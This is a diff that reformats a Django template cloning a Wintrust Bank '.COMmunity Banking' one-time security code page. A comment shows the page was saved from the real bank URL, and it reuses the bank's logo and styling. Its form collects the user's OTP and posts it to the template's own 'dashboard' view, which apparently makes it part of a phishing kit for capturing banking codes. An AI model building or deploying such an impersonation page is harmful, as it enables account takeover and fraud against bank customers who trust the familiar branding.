@@ -1,108 +1,191 @@
 {% load static %}
 <!DOCTYPE html>
 <!-- saved from url=(0050)https://cibng.ibanking-services.com/Eam/Ooba/Index -->
-<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    
-    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta data-appid="CeB">
+<html lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta data-appid="CeB" />
 
     <!-- Latest minified CSS -->
-    <link rel="stylesheet" href="{% static './Auth_files/bootstrap.min.css'%}" type="text/css">
-    <link rel="stylesheet" href="{% static './Auth_files/eam.css'%}" type="text/css">
-    <link rel="stylesheet" href="{% static './Auth_files/fis-icon-font.css'%}" type="text/css">
+    <link
+      rel="stylesheet"
+      href="{% static './Auth_files/bootstrap.min.css'%}"
+      type="text/css"
+    />
+    <link
+      rel="stylesheet"
+      href="{% static './Auth_files/eam.css'%}"
+      type="text/css"
+    />
+    <link
+      rel="stylesheet"
+      href="{% static './Auth_files/fis-icon-font.css'%}"
+      type="text/css"
+    />
 
-    <link href="{% static './Auth_files/BankStyles.css' %}" rel="stylesheet" type="text/css">
-
+    <link
+      href="{% static './Auth_files/BankStyles.css' %}"
+      rel="stylesheet"
+      type="text/css"
+    />
 
     <!-- Latest JavaScript -->
-    <script src="{% static './Auth_files/popper.min.js' %}"></script>    
+    <script src="{% static './Auth_files/popper.min.js' %}"></script>
     <script src="{% static './Auth_files/jquery-3.5.1.min.js' %}"></script>
     <script src="{% static './Auth_files/bootstrap.min.js' %}"></script>
     <script src="{% static './Auth_files/eam.js' %}"></script>
     <script src="{% static './Auth_files/eam-visual-validator.js' %}"></script>
-    <script type="{% static 'text/javascript' %}">window.name = "";</script>
+    <script type="{% static 'text/javascript' %}">
+      window.name = "";
+    </script>
 
-    <link rel="stylesheet" href="{% static './Auth_files/jquery.smartbanner.css' %}" type="text/css" media="screen">
+    <link
+      rel="stylesheet"
+      href="{% static './Auth_files/jquery.smartbanner.css' %}"
+      type="text/css"
+      media="screen"
+    />
     <script src="{% static './Auth_files/jquery.smartbanner.js' %}"></script>
-
 
     <title>Sign in to .COMmunity Banking</title>
 
-    
-	<script src="{% static './Auth_files/eam-ooba-kickoff.js'%}"></script>
+    <script src="{% static './Auth_files/eam-ooba-kickoff.js'%}"></script>
+  </head>
 
-</head>
+  <body data-new-gr-c-s-check-loaded="14.1028.0" data-gr-ext-installed="">
+    <header>
+      <a
+        id="skippy"
+        class="sr-only sr-only-focusable"
+        href="https://cibng.ibanking-services.com/Eam/Ooba/Index#secureHideArea"
+        ><span class="skiplink-text">Skip to main content</span></a
+      >
+      <div class="fis-header-content">
+        <a
+          class="brandedImageLink"
+          title="Wintrust Bank"
+          href="http://www.wintrustbank.com/"
+          ><img
+            id="_BankLogo"
+            class=""
+            title="Wintrust Bank"
+            alt=""
+            src="{% static './Auth_files/b380_Wintrust.svg' %}"
+        /></a>
+      </div>
+    </header>
 
-<body data-new-gr-c-s-check-loaded="14.1028.0" data-gr-ext-installed="">
-	<header>
-        <a id="skippy" class="sr-only sr-only-focusable" href="https://cibng.ibanking-services.com/Eam/Ooba/Index#secureHideArea"><span class="skiplink-text">Skip to main content</span></a>
-		<div class="fis-header-content"><a class="brandedImageLink" title="Wintrust Bank" href="http://www.wintrustbank.com/"><img id="_BankLogo" class="" title="Wintrust Bank" alt="" src="{% static './Auth_files/b380_Wintrust.svg' %}"></a></div>
-	</header>
-
-	<div id="content" class="fis-page-content">
-		<div class="">
-            <div id="secureHideArea" class="container secureHideArea" role="main" tabindex="-1">
-                {% for content in context.error %}
-                <div><div class="fis-banner-notice"><table role="presentation"><tbody><tr><td><span class="icon-Information med-ic"></span></td><td><span class="message"> {{content}}</span></td></tr></tbody></table></div></div>
-                {% endfor %}
-                <div class="row">
-                    <h1 class="col-sm-12">Sign in to <span class="productName">.COMmunity Banking</span></h1>
-                </div>
-                {% for content in context.row %}
-
-                <h6 class="workspaceSubHeader">
-                    One-Time Security Code
-                </h6>
-                <div class="row">
-                    <table role="presentation">
-                        <tbody>
-                        <tr>
-                            <td><div class="col-sm-3 fis-ooba-shield">&nbsp;</div></td>
-                            <td class="col-sm-9" style="vertical-align: middle;">A One Time Code has been sent to your associated E-mail <a href=""><strong>{{content.email}}</strong> </a> . <span style="display: none;"><a class="_learnMore" href="https://cibng.ibanking-services.com/Eam/Ooba/Index" target="_blank">Learn more</a>.</span></td>
-                        </tr>
-                        </tbody>
-                    </table>
-                </div>
-                
-
-<form name="form1" action="{% url 'dashboard' %}" method="POST" autocomplete="off">
-    {% csrf_token %}
-    
-        <input name="userId" value="{{content.userid}}" type="hidden"/>
-        <div class="row"><div class="form-control-label col-sm-4 w-100">User ID:</div><div class="form-control-value col-sm-7 break-all"><h4>{{content.userid}}</h4></div></div>
-            <div class="row"><div class="form-control-label col-sm-4 w-100">Security Code:</div><div class="form-control-value col-sm-7 break-all">
-                <input type="text" class="form-control" placeholder="" id="otp" name="otp">
+    <div id="content" class="fis-page-content">
+      <div class="">
+        <div
+          id="secureHideArea"
+          class="container secureHideArea"
+          role="main"
+          tabindex="-1"
+        >
+          {% for content in context.error %}
+          <div>
+            <div class="fis-banner-notice">
+              <table role="presentation">
+                <tbody>
+                  <tr>
+                    <td><span class="icon-Information med-ic"></span></td>
+                    <td><span class="message"> {{content}}</span></td>
+                  </tr>
+                </tbody>
+              </table>
             </div>
-            <p style="text-align: left;">Security code expires in 15 minutes &nbsp;</p><a href="#">Resent Code</a>
+          </div>
+          {% endfor %}
+          <div class="row">
+            <h1 class="col-sm-12">
+              Sign in to <span class="productName">.COMmunity Banking</span>
+            </h1>
+          </div>
+          {% for content in context.row %}
+
+          <h6 class="workspaceSubHeader">One-Time Security Code</h6>
+          <div class="row">
+            <table role="presentation">
+              <tbody>
+                <tr>
+                  <td><div class="col-sm-3 fis-ooba-shield">&nbsp;</div></td>
+                  <td class="col-sm-9" style="vertical-align: middle">
+                    A One Time Code has been sent to your associated E-mail
+                    <a href=""><strong>{{content.email}}</strong> </a> .
+                    <span style="display: none"
+                      ><a
+                        class="_learnMore"
+                        href="https://cibng.ibanking-services.com/Eam/Ooba/Index"
+                        target="_blank"
+                        >Learn more</a
+                      >.</span
+                    >
+                  </td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+
+          <form
+            name="form1"
+            action="{% url 'dashboard' %}"
+            method="POST"
+            autocomplete="off"
+          >
+            {% csrf_token %}
+
+            <input name="userId" value="{{content.userid}}" type="hidden" />
+            <div class="row">
+              <div class="form-control-label col-sm-4 w-100">User ID:</div>
+              <div class="form-control-value col-sm-7 break-all">
+                <h4>{{content.userid}}</h4>
+              </div>
+            </div>
+            <div class="row">
+              <div class="form-control-label col-sm-4 w-100">
+                Security Code:
+              </div>
+              <div class="form-control-value col-sm-7 break-all">
+                <input
+                  type="text"
+                  class="form-control"
+                  placeholder=""
+                  id="otp"
+                  name="otp"
+                />
+              </div>
+              <p style="text-align: left">
+                Security code expires in 15 minutes &nbsp;
+              </p>
+              <a href="#">Resend Code</a>
+            </div>
+            {% endfor %}
+
+            <div class="form-group row">
+              <div class="col-sm w-100">
+                <button id="_oobaGo" type="submit" class="btn btn-primary">
+                  Submit Security Code
+                </button>
+              </div>
+              <div class="col-sm w-100">
+                <a href="{% url 'banking' %}" class="btn btn-secondary"
+                  >Cancel</a
+                >
+              </div>
+            </div>
+            <hr />
+          </form>
+
+          <a href="{% url 'banking' %}">Enter different User ID</a>
         </div>
-    {% endfor %}
-
-
-
-
-    <div class="form-group row">
-        <div class="col-sm w-100">
-            <button id="_oobaGo" type="submit" class="btn btn-primary" >Submit Security Code</button>
-        </div>
-        <div class="col-sm w-100">
-            <a href="{% url 'banking' %}" class="btn btn-secondary">Cancel</a>
-        </div>
+      </div>
     </div>
-    <hr>
-</form>
-
-    <a href="{% url 'banking' %}">Enter different User ID</a>
-
-            </div>
-		</div>
-	</div>
-
-    
-
-    
-    
-
-
-
-</body><grammarly-desktop-integration data-grammarly-shadow-root="true"></grammarly-desktop-integration></html>
+  </body>
+  <grammarly-desktop-integration
+    data-grammarly-shadow-root="true"
+  ></grammarly-desktop-integration>
+</html>
